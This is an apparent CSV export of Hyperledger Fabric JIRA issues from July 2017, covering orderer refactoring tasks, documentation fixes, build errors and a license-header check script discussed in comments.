Use MsgProcessor in Broadcast component,FAB-5267,19186,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,12/Jul/17 3:19 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Aug/17 11:14 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7zb:",,,,,,,,,,,2.0,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 4:53 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11507;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove filters from Broadcast path,FAB-5268,19187,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,12/Jul/17 3:19 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Aug/17 11:14 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7zj:",,,,,,,,,,,2.0,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove filter.Committer notion entirely,FAB-5269,19188,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,12/Jul/17 3:19 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 9:46 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7zr:",,,,,,,,,,,2.0,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 4:53 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11509/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove filters from multichannel,FAB-5270,19189,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,12/Jul/17 3:20 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 10:03 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7zz:",,,,,,,,,,,2.0,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 4:54 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11511/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move solo to optimized message flow,FAB-5271,19190,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,12/Jul/17 3:20 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 10:03 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy807:",,,,,,,,,,,2.0,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 4:54 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11513/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix npm version in readthedocs,FAB-5272,19191,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,denyeart,denyeart,12/Jul/17 3:31 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Aug/17 6:02 PM,v1.0.0,,,Future,,fabric-docs,,,,,,1,,,,,,,"Prereq doc page

[https://hyperledger-fabric.readthedocs.io/en/latest/prereqs.html#node-js-runtime-and-npm]

says to get latest npm version:

npm install npm@latest -g

However the latest npm version is incompatible with version of node that fabric sdk runs on.

[~jimthematrix] advised that the command in the doc should be changed to:

npm install npm@3.10.10 -g

 ",,denyeart,JonathanLevi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx2dz:",,,,,,,,,,,,,,,,,,,,,,,denyeart,JonathanLevi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Jul/17 3:39 AM;JonathanLevi;(even though I'm relatively ""useless"" when it comes to Node)
 Yes, I'd always vote for versioned dependencies... 

Can we please push a fix?;;;","12/Jul/17 3:53 AM;denyeart;Fix is ready:

https://gerrit.hyperledger.org/r/#/c/11559/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add signing and multiple go routine sender support to broadcast_timestamp,FAB-5273,19192,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,12/Jul/17 3:33 AM,21/Jul/18 3:53 AM,28/Oct/23 3:00 AM,11/Aug/17 4:52 PM,,,,,,fabric-orderer,,,,,,0,performance,,,,,,"The {{broadcast_timestamp}} sample client is a good way to exercise only the {{Broadcast}} path without involving any of the other components of the fabric.  However, it was developed before MSP support had been integrated into the orderer.

Further, a single client submitting on a single stream is not a realistic stress test of the orderer, so adding multiple go routines to submit would make this stressing far more realistic.",,jyellick,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy80f:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jyellick,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Make WriteBlock Asynchronous, except under WriteConfigBlock",FAB-5274,19193,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,12/Jul/17 4:00 AM,18/Oct/18 11:56 AM,28/Oct/23 3:00 AM,14/Aug/17 2:45 AM,v1.0.0,,,v1.1.0,,fabric-orderer,,,,,,0,performance,,,,,,"The {{WriteBlock}} call has traditionally been a synchronous one.  This is because the committers needed to commit before the next batch of messages could be processed.  However, with the improvements in FAB-5258 it should be possible to perform the block generation, signing, and writing to disk all on its own go routine.  Because the consenter pieces are all single threaded, this should have a noticeable effect on the throughput of the system.  Preliminary tests showed a 40% improvement (but note, this is extremely preliminary and used some cheats).

To complete this story, the ChainSupport should be given a committing go routine.  It should handle calls to {{WriteBlock}}, {{CreateNextBlock}} and {{WriteConfigBlock}}.  In general {{WriteBlock}} should return immediately while the committing go routine does its work.  {{CreateNextBlock}} and {{WriteConfigBlock}} should block until the last call to {{WriteBlock}} has completed (as {{CreateNextBlock}} requires the hash of the previous block and {{WriteConfigBlock}} will modify the config sequence.",,Hangyu_FJH,inatatsu,jyellick,nitingaur,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6421,FAB-6443,,,,,,,,,,,,,,,FAB-12521,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy80n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,Hangyu_FJH,inatatsu,jyellick,nitingaur,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Jul/17 4:54 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11785/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Following instructions in chaincode4ade.html leads to build error,FAB-5275,19195,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,yuki-kon,tkuhrt,tkuhrt,12/Jul/17 4:55 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,01/Oct/17 9:13 PM,v1.0.0,v1.0.1,v1.0.2,v1.1.0,,fabric-docs,,,,,,0,,,,,,,"I copied the individual source snippets as I went through the [chaincode4ade.html|http://hyperledger-fabric.readthedocs.io/en/latest/chaincode4ade.html] file.  At the end of the document, it says that we must add a main; however, it does not say anything about adding the type for SimpleAsset. Thus, it resulted in the following when I did a build:

{{$ go build --tags nopkcs11}}{{# simple-asset-chaincode}}{{./sacc.go:11: undefined: SimpleAsset}}{{./sacc.go:61: 
}}{{undefined: SimpleAsset}}{{./sacc.go:82: 
undefined: SimpleAsset}}

This is easy to fix, as the full source snippet has the information necessary; however, it would be nice to call out this requirement in one of the steps.",,tkuhrt,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy81j:",,,,,,,,,,,,,,,,,,,,,,,tkuhrt,yuki-kon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Sep/17 8:31 AM;yuki-kon;CR posted here: https://gerrit.hyperledger.org/r/#/c/13383/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add VirtualBox provisioning to the fabric-deploy project.,FAB-5276,19196,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jtclark,jtclark,jtclark,12/Jul/17 4:57 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,12/Oct/17 11:53 AM,,,,,,fabric-quality,,,,,,0,,,,,,,"In the fabric-deploy project, add VirtualBox provisioning to the Ansible deploy scripts provided.",,jtclark,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy81r:",,,,,,,,,,,,,,,,,,,,,,,jtclark,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Oct/17 11:53 AM;jtclark;VirtualBox provisioning has been added to the fabric-deploy project. The fabric-deploy project includes a collection of ansible playbooks used for deploying Fabric. The playbooks have now been added to the Cello project, which includes a deployment option to a VirtualBox environment.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
False error while starting the network during chaincode4ade.html tutorial,FAB-5277,19198,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,tkuhrt,tkuhrt,12/Jul/17 5:35 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Oct/17 1:13 AM,v1.0.0,,,,,fabric-samples,,,,,,0,,,,,,,"While running through chaincode4ade.html, I received an error at [starting the network|http://hyperledger-fabric.readthedocs.io/en/latest/chaincode4ade.html#terminal-1-start-the-network]

{{ERROR: An HTTP request took too long to complete. Retry with --verbose to obtain debug information.
}}{{If you encounter this issue regularly because of slow network conditions, consider setting COMPOSE_HTTP_TIMEOUT to a higher value (current value: 60).}}

However, when I did a `docker ps -a`, I saw that my network was still running, and I was able to complete the rest of the tutorial. Reporting this because it could be quite concerning to someone new starting out who may think that there is a true error.

$ docker ps -a

{{CONTAINER ID        IMAGE                        COMMAND                  CREATED             STATUS              PORTS                                            NAMES}}

{{1880506a178c        hyperledger/fabric-tools     ""/bin/bash -c ./scrip""   3 minutes ago       Up 3 minutes                                                         cli}}

{{34b8128024eb        hyperledger/fabric-ccenv     ""/bin/bash -c 'sleep ""   3 minutes ago       Up 3 minutes                                                         chaincode}}

{{3e35b8e2706a        hyperledger/fabric-peer      ""peer node start --pe""   3 minutes ago       Up 3 minutes        0.0.0.0:7051->7051/tcp, 0.0.0.0:7053->7053/tcp   peer}}

{{853dc6df2fe4        hyperledger/fabric-orderer   ""orderer""                3 minutes ago       Up 3 minutes        0.0.0.0:7050->7050/tcp                           orderer}}",,markparz,mastersingh24,qiang0723,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy827:",,,,,,,,,,,,,,,,,,,,,,,markparz,mastersingh24,qiang0723,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Oct/17 3:49 AM;mastersingh24;[~tkuhrt] Not sure there's really anything to do here?  The error is from docker compose and does actually tell you how to fix it;;;","27/Oct/17 1:13 AM;markparz;I'm going to close this for now, if there is something to add, we might want to just put a note in Stack Overflow that it's something generated from docker compose as Gari says.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
update 1.0.0 version in release test suite,FAB-5279,19200,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,12/Jul/17 6:26 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,13/Jul/17 3:13 AM,v1.0.0,,,,,fabric-build,,,,,,0,build-system,,,,,,update 1.0.0 version in release test suite. In some of the scripts in test/regression/release folder are still referring 1.0.0-rc1 version.,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy82n:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Jul/17 7:05 AM;rameshthoomu;patch has been submitted and it's in review;;;","13/Jul/17 3:13 AM;rameshthoomu;patch has been and merged;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document a workaround to the 'Filename too long' error on Windows (w. git clone fabric-samples),FAB-5280,19202,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Done,lehors,lehors,lehors,12/Jul/17 7:44 AM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,22/Jul/17 4:01 AM,v1.0.0,,,v1.0.1,,fabric-docs,,,,,,0,documentation,Documentation,,,,,"Following the instructions to install the samples fails on Windows (7) using git from Docker Toolbox as suggested:
{code:java}
$ git clone https://github.com/hyperledger/fabric-samples.git fabric-test
Cloning into 'fabric-test'...
remote: Counting objects: 388, done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 388 (delta 0), reused 2 (delta 0), pack-reused 381
Receiving objects: 100% (388/388), 131.83 KiB | 0 bytes/s, done.
Resolving deltas: 100% (77/77), done.
Checking connectivity... done.
error: unable to create file balance-transfer/artifacts/channel/crypto-config/ordererOrganizations/example.com/orderers/orderer.example.com/msp/keystore/2fb065725bf1b7e2811c0e8ca8d37f5a951fc4cd1162a47aad8accf9ddd10291_sk: Filename too long
error: unable to create file balance-transfer/artifacts/channel/crypto-config/ordererOrganizations/example.com/users/Admin@example.com/msp/keystore/db670eed8487a93c35ae448b9f84c2f241a7a8c87df0544fc1dc08baf7832aa0_sk: Filename too long
error: unable to create file balance-transfer/artifacts/channel/crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/msp/keystore/27db82c96b1482480baa1c75f80e5cce249beaab27b70c741bb0e2554355957e_sk: Filename too long
error: unable to create file balance-transfer/artifacts/channel/crypto-config/peerOrganizations/org1.example.com/peers/peer1.org1.example.com/msp/keystore/fdee12a3510fde3155c37128cfec26090ae249bfbca28f884e60c21338493edd_sk: Filename too long
error: unable to create file balance-transfer/artifacts/channel/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp/keystore/5890f0061619c06fb29dea8cb304edecc020fe63f41a6db109f1e227cc1cb2a8_sk: Filename too long
error: unable to create file balance-transfer/artifacts/channel/crypto-config/peerOrganizations/org1.example.com/users/User1@org1.example.com/msp/keystore/73cdc0072c7203f1ec512232c780fc84acc9752ef30ebc16be1f4666c02b614b_sk: Filename too long
error: unable to create file balance-transfer/artifacts/channel/crypto-config/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/msp/keystore/0d9f72608133ee627b570b6af6877666bc8f365746f9329d6dd8a5f54e53e2ab_sk: Filename too long
error: unable to create file balance-transfer/artifacts/channel/crypto-config/peerOrganizations/org2.example.com/peers/peer1.org2.example.com/msp/keystore/27ccb54a06020260c66c65bec91f91e1c9043e3076d3d6128692e7271c4c7a2c_sk: Filename too long
error: unable to create file balance-transfer/artifacts/channel/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp/keystore/1995b11d6573ed3be52fcd7a5fa477bc0f183e1f5f398c8281d0ce7c2c75a076_sk: Filename too long
error: unable to create file balance-transfer/artifacts/channel/crypto-config/peerOrganizations/org2.example.com/users/User1@org2.example.com/msp/keystore/585175c83bac91fc0c1ce8f9d0ff9aefa47c565678f100ca8673db249ee785ac_sk: Filename too long
fatal: unable to checkout working tree
warning: Clone succeeded, but checkout failed.
You can inspect what was checked out with 'git status'
and retry the checkout with 'git checkout -f HEAD'{code}
The easy fix is to do the following before:
{code:java}
$ git config --global core.longpaths true
$ git clone https://github.com/hyperledger/fabric-samples.git fabric-test
Cloning into 'fabric-test'...
remote: Counting objects: 388, done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 388 (delta 0), reused 2 (delta 0), pack-reused 381 eceiving objects: 93% (361/388)

Receiving objects: 100% (388/388), 131.83 KiB | 0 bytes/s, done.
Resolving deltas: 100% (77/77), done.
Checking connectivity... done.{code}
This needs to be added to the prerequisites.

 ",,lehors,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy833:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,lehors,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Jul/17 7:42 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/11579/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
make license fails with error,FAB-5282,19204,,Bug,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,C0rWin,C0rWin,C0rWin,12/Jul/17 8:02 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Jul/17 6:31 AM,v1.0.0,,,,,fabric-orderer,,,,,,0,,,,,,,"Running `make license` command leads to following output:

{code}
Checking committed files for SPDX-License-Identifier headers ...
The following files are missing SPDX-License-Identifier headers:
orderer/multichain/manager.go
orderer/multichain/manager_test.go

Please replace the Apache license header comment text with:
SPDX-License-Identifier: Apache-2.0
{code}

Therefore as suggested in error warning license header in those two files need to be replaced with:

{code}
/*
Copyright IBM Corp. All Rights Reserved.

SPDX-License-Identifier: Apache-2.0
*/
{code}",,awattez,BalajiSR,C0rWin,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy83j:",,,,,,,,,,,,,,,,,,,,,,,awattez,BalajiSR,C0rWin,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Jul/17 11:16 AM;kchristidis;https://gerrit.hyperledger.org/r/#/c/11577/;;;","12/Jul/17 3:13 PM;BalajiSR;I did an reinstallation of fabric and when I did a build it gave another file missing error though the file is present. Error details are below

Test build output:

docker tag hyperledger/fabric-tools hyperledger/fabric-tools:x86_64-1.0.1-snapshot-f56a82e
Checking committed files for SPDX-License-Identifier headers ...
The following files are missing SPDX-License-Identifier headers:
release_notes/v1.0.0.txt

Please replace the Apache license header comment text with:
SPDX-License-Identifier: Apache-2.0
Makefile:111: recipe for target 'license' failed
make: *** [license] Error 1;;;","12/Jul/17 5:24 PM;awattez;Hi, ihave the same trouble on vagrant devenv environment:
{code:java}
/src/github.com/hyperledger/fabric/devenv (master)
$ vagrant up
$ vagrant ssh
{code}
Go to the VM :
{code:java}
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-83-generic x86_64)

* Documentation: https://help.ubuntu.com
* Management: https://landscape.canonical.com
* Support: https://ubuntu.com/advantage

Get cloud support with Ubuntu Advantage Cloud Guest:
http://www.ubuntu.com/business/services/cloud

1 package can be updated.
1 update is a security update.


Last login: Wed Jul 12 07:57:24 2017 from 10.0.2.2
ubuntu@hyperledger-devenv:b8e189e:/opt/gopath/src/github.com/hyperledger/fabric$ make dist-clean all
Checking committed files for SPDX-License-Identifier headers ...
The following files are missing SPDX-License-Identifier headers:
(standard input)

Please replace the Apache license header comment text with:
SPDX-License-Identifier: Apache-2.0
Makefile:111: recipe for target 'license' failed
make: *** [license] Error 1
ubuntu@hyperledger-devenv:b8e189e:/opt/gopath/src/github.com/hyperledger/fabric$ make license
Checking committed files for SPDX-License-Identifier headers ...
The following files are missing SPDX-License-Identifier headers:
(standard input)

Please replace the Apache license header comment text with:
SPDX-License-Identifier: Apache-2.0
Makefile:111: recipe for target 'license' failed
make: *** [license] Error 1

{code}
Here the problem come from (standard input)

 

 ;;;","12/Jul/17 9:35 PM;C0rWin;Added *.txt files to exclusion list to skip license header validation. 
CR is updated, so should work now.;;;","12/Jul/17 10:02 PM;BalajiSR;I tried again by cloning the code and I still receive the error

*Clone git:* 
{quote}root@: git clone ssh://xxxxx@gerrit.hyperledger.org:29418/fabric && scp -p -P 29418 xxxxxx@gerrit.hyperledger.org:hooks/commit-msg fabric/.git/hooks/
{quote}
*build*
{quote}root@: cd $GOPATH/src/github.com/hyperledger/fabric
root@: make dist-clean all
{quote}
*Output:*
{quote}docker tag hyperledger/fabric-tools hyperledger/fabric-tools:x86_64-1.0.1-snapshot-f56a82e
Checking committed files for SPDX-License-Identifier headers ...
The following files are missing SPDX-License-Identifier headers:
release_notes/v1.0.0.txt

Please replace the Apache license header comment text with:
SPDX-License-Identifier: Apache-2.0
Makefile:111: recipe for target 'license' failed
make: *** [license] Error 1
{quote};;;","12/Jul/17 10:10 PM;C0rWin;Hm, this is strange as all txt files should be ignored based on recent change I've made.

{code}
#!/bin/bash
#
# Copyright IBM Corp. All Rights Reserved.
#
# SPDX-License-Identifier: Apache-2.0
#

CHECK=$(git diff --name-only HEAD * | grep -v .png$ | grep -v .rst$ | grep -v .git \
  | grep -v .md$ | grep -v ^vendor/ | grep -v ^build/ | grep -v .pb.go$ | grep -v .txt | sort -u)

if [[ -z ""$CHECK"" ]]; then
  CHECK=$(git diff-tree --no-commit-id --name-only -r $(git log -2 \
    --pretty=format:""%h"") | grep -v .png$ | grep -v .rst$ | grep -v .git \
    | grep -v .md$ | grep -v ^vendor/ | grep -v ^build/ | grep -v .pb.go$ | grep -v .txt | sort -u)
fi

echo ""Checking committed files for SPDX-License-Identifier headers ...""
missing=`echo $CHECK | xargs grep -L ""SPDX-License-Identifier""`
if [ -z ""$missing"" ]; then
   echo ""All files have SPDX-License-Identifier headers""
   exit 0
fi
echo ""The following files are missing SPDX-License-Identifier headers:""
echo ""$missing""
{code}

Are you sure working with latest CR? https://gerrit.hyperledger.org/r/#/c/11577/2

{code}
git fetch ssh://C0rWin@gerrit.hyperledger.org:29418/fabric refs/changes/77/11577/2 && git checkout FETCH_HEAD -b FAB-5282
{code};;;","12/Jul/17 10:22 PM;awattez;Hi,

i still have the problem but not on standard input :( and not only on vagrant devenv Fabric
{code:java}
ubuntu@ubuntu-VirtualBox:~/go/src/github.com/hyperledger/fabric$ git rev-parse HEAD
f56a82e36e040e1c1a986edfceac014ba1516571
{code}
{code:java}
Successfully tagged hyperledger/fabric-tools:latest
docker tag hyperledger/fabric-tools hyperledger/fabric-tools:x86_64-1.0.1-snapshot-f56a82e
Checking committed files for SPDX-License-Identifier headers ...
The following files are missing SPDX-License-Identifier headers:
release_notes/v1.0.0.txt

Please replace the Apache license header comment text with:
SPDX-License-Identifier: Apache-2.0
Makefile:111: recipe for target 'license' failed
make: *** [license] Error 1
{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE: Integrate tests into the CI daily test suite,FAB-5283,19205,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jtclark,jtclark,jtclark,12/Jul/17 9:37 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/May/18 8:29 PM,,,,,,fabric-quality,,,,,,0,,,,,,,Integrate the Performance Traffic Engine tests into our daily test suite.,,jtclark,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-3833,FAB-3832,FAB-3808,FAB-3807,,,,,,,,,,,,,"08/Nov/17 12:31 AM;jtclark;CINotes;https://jira.hyperledger.org/secure/attachment/13300/CINotes",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy83r:",,,,,,,,,,,,,,,,,,,,,,,jtclark,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/openconta